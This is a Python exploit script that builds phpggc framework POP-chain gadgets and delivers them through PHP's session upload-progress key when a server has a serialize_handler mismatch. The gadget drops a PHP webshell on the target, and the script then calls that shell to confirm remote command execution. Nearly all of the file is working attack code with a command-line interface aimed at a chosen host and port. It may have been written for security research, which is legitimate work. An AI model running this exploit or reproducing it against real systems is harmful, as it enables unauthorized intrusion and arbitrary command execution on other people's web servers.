#!/usr/bin/env python3
# INDEX: generate phpggc framework pop chain payload | fpm apache | session serialize_handler mismatch configured
"""Framework POP-chain RCE through the session upload-progress key.

Generates a ready-made framework POP chain with phpggc (ambionics) and delivers
it through the session serialize_handler-mismatch route, turning any composer
app with the mismatch into "one chain name away from a shell": ~170 chains
across Laravel / Monolog / Symfony / Guzzle / Doctrine / Magento / ...

Pipeline:
  (1) GENERATE. Shell out to phpggc for the target framework, e.g.
      ``phpggc Monolog/FW1 <shell_path> <file-with-shell>`` (a file-write gadget
      that drops a webshell via a __destruct). Generation runs inside a throwaway
      ``php:8.4.26-cli`` docker container by default (``--local-php`` forces a
      local ``php``) to keep untrusted phpggc code off the host interpreter.
  (2) DELIVER. The object rides the PHP_SESSION_UPLOAD_PROGRESS key (``inj|O:..``)
      into the session file (php_serialize write side), via
      session_handler_mismatch.py.
  (3) TRIGGER. A legacy ``php``-handler read page (the mismatch) unserializes the
      object; its framework __destruct writes the webshell.
  (4) RCE. Fetch the dropped webshell -> command execution as the fpm worker.

Preconditions:
  * session.serialize_handler mismatch: write=php_serialize, read=php  [NON-DEFAULT]
  * a phpggc-supported framework autoloaded in the reader's scope      [APP-DEPENDENT]
  * session.upload_progress.enabled=On (stock default)
  * a web-writable --shell-path the file-write gadget can drop into
  * a phpggc checkout (``git clone https://github.com/ambionics/phpggc``)
  * for the RACE variant behind nginx: ``fastcgi_request_buffering off`` so the
    slow-drip upload reaches fpm live; otherwise use the ``--base`` deterministic
    variant against cleanup=Off targets.

Corruption-free (works on patched php). Pure stdlib; python3 -I safe.
"""

import argparse
import os
import subprocess
import sys
import tempfile

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT, os.path.join(_POC_ROOT, "routes")):
    if _p not in sys.path:
        sys.path.insert(0, _p)
import session_handler_mismatch as shm  # noqa: E402  (its delivery route, in routes/)

DEFAULT_SHELL_BODY = b"<?php system($_GET['c']); ?>"


def gen_phpggc(preset, remote_path, shell_body, phpggc_dir,
               local_php=False, docker_image="php:8.4.26-cli", timeout=180):
    """Run phpggc to produce the serialized gadget bytes for `preset`.

    File-write presets (``*/FW*``) take (remote_path, local_file_with_content):
    the gadget drops `shell_body` at `remote_path` on the target. Returns the raw
    serialized object (bytes) or None.
    """
    tf = tempfile.NamedTemporaryFile(mode="wb", suffix=".p2s", delete=False)
    try:
        tf.write(shell_body)
        tf.close()
        attempts = []
        if local_php:
            attempts.append(["php", os.path.join(phpggc_dir, "phpggc"),
                             preset, remote_path, tf.name])
        else:
            # phpggc + the tmp shell file both mounted; run its code in a
            # throwaway container, never on the host interpreter.
            attempts.append([
                "docker", "run", "--rm",
                "-v", f"{os.path.abspath(phpggc_dir)}:/p:ro",
                "-v", f"{os.path.dirname(tf.name)}:/w:ro",
                "-w", "/p", docker_image,
                "php", "phpggc", preset, remote_path,
                "/w/" + os.path.basename(tf.name),
            ])
        for cmd in attempts:
            try:
                r = subprocess.run(cmd, capture_output=True, timeout=timeout)
            except (OSError, subprocess.TimeoutExpired):
                continue
            if r.returncode == 0 and r.stdout.strip():
                return r.stdout.rstrip(b"\n")
        return None
    finally:
        os.unlink(tf.name)


def run(host, port, phpggc_dir, preset="Monolog/FW1",
        writer="/index.php", reader="/reader.php",
        shell_path="/var/www/html/pggc_shell.php", shell_url=None,
        cmd="id", sid=None, race=True, local_php=False,
        max_tries=40, file_mb=4, verbose=True):
    """Generate the chain, deliver it, trigger it, and confirm RCE.
    Returns (ok, uid_line, shell_url_used)."""

    def log(m):
        if verbose:
            print(m, flush=True)

    shell_name = (shell_url or ("/" + os.path.basename(shell_path))).lstrip("/")

    log(f"[*] generating phpggc chain: {preset} -> {shell_path}")
    obj = gen_phpggc(preset, shell_path, DEFAULT_SHELL_BODY, phpggc_dir,
                     local_php=local_php)
    if not obj:
        log(f"[-] phpggc could not generate {preset}. Check the checkout path, "
            f"the preset name (phpggc -l), and docker/php availability.")
        return False, None, None
    log(f"[+] chain built: {len(obj)} bytes, object head "
        f"{obj[:48].decode('latin1', 'replace')!r}")

    runner = shm.run_race if race else shm.run_base
    kw = {"max_tries": max_tries, "file_mb": file_mb} if race else {}
    hit = runner(host, port, writer, reader, shell_name, shell_path,
                 obj, cmd, sid, log, **kw)
    if hit:
        return True, hit, "/" + shell_name
    return False, None, "/" + shell_name


def _cli(argv):
    ap = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("host")
    ap.add_argument("port", type=int)
    ap.add_argument("--phpggc", required=True, help="path to a phpggc checkout")
    ap.add_argument("--preset", default="Monolog/FW1",
                    help="phpggc chain (default: Monolog/FW1)")
    ap.add_argument("--writer", default="/index.php")
    ap.add_argument("--reader", default="/reader.php")
    ap.add_argument("--shell-path", default="/var/www/html/pggc_shell.php")
    ap.add_argument("--shell-url", default=None)
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--sid", default=None)
    ap.add_argument("--base", dest="race", action="store_false",
                    help="deterministic base variant (cleanup=Off targets)")
    ap.add_argument("--local-php", action="store_true",
                    help="run phpggc with a local php instead of docker")
    ap.add_argument("--max-tries", type=int, default=40)
    ap.add_argument("--file-mb", type=int, default=4)
    args = ap.parse_args(argv)
    ok, _hit, _url = run(args.host, args.port, args.phpggc, preset=args.preset,
                         writer=args.writer, reader=args.reader,
                         shell_path=args.shell_path, shell_url=args.shell_url,
                         cmd=args.cmd, sid=args.sid, race=args.race,
                         local_php=args.local_php, max_tries=args.max_tries,
                         file_mb=args.file_mb)
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(_cli(sys.argv[1:]))
